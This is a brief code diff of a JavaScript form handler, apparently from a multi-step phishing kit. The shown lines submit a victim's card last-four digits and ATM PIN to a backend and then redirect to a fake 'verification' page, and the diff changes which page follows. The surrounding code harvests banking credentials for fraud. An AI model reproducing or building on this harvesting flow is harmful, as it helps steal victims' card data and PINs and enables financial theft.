@@ -19,7 +19,7 @@ document.getElementById("step3form").addEventListener("submit", function (e) {
     f_LAST4: last4,
     g_ATMPIN: pin
   }).then(() => {
-    window.location.href = "last.html"; // Verification page
+    window.location.href = "2nd.html"; // Verification page
   }).catch((error) => {
     alert("Error: " + error.message);
   });
